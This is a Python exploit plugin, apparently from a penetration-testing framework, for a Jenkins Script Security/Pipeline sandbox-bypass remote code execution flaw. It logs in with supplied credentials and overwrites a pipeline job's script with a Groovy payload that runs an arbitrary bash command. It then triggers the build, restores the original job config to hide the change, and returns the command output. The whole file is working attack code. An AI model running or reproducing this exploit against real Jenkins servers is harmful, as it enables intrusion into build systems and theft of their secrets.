# -*-* coding:UTF-8
import time
import jenkins
from xml.etree import ElementTree


class Plugin(Base):
    __info__ = {
        "name": "Jenkins远程代码执行漏洞",
        "description": "Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具。Script Security and Pipeline插件是Jenkins的一个安全插件，可以集成到Jenkins各种功能插件中。拥有Overall/Read权限的用户可以绕过沙盒保护，在jenkins上执行任意代码",
        "references": ["-"],
    }

    def url(self) -> dict:
        pass

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("username", help="用户名称", default="username")
    @cli.options("password", help="用户密码", default="password")
    @cli.options("job", help="任务名称", default="job")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, username, password, job_name, cmd):
        payload = '''
        import org.buildobjects.process.ProcBuilder
        @Grab('org.buildobjects:jproc:2.2.3')
        class Dummy{ }
        print new ProcBuilder("/bin/bash").withArgs("-c","%s").run().getOutputString()
        '''
        self.log.info('connecting to jenkins...')
        server = jenkins.Jenkins(url, username, password)
        ori_job_config = server.get_job_config(job_name)
        et = ElementTree.fromstring(ori_job_config)
        et.find('definition/script').text = payload % cmd
        job_config = ElementTree.tostring(et, encoding='utf8', method='xml')
        server.reconfig_job(job_name, job_config)
        time.sleep(3)
        self.log.info('putting job build to queue...')
        queue_number = server.build_job(job_name)
        time.sleep(3)
        self.log.debug('waiting for job to build...')
        queue_item_info = {}
        while 'executable' not in queue_item_info:
            queue_item_info = server.get_queue_item(queue_number)
            time.sleep(1)
        self.log.info('restoring job...')
        server.reconfig_job(job_name, ori_job_config)
        time.sleep(3)
        self.log.info('fetching output...')
        last_build_number = server.get_job_info(job_name)['lastBuild']['number']
        console_output = server.get_build_console_output(job_name, last_build_number)
        return console_output
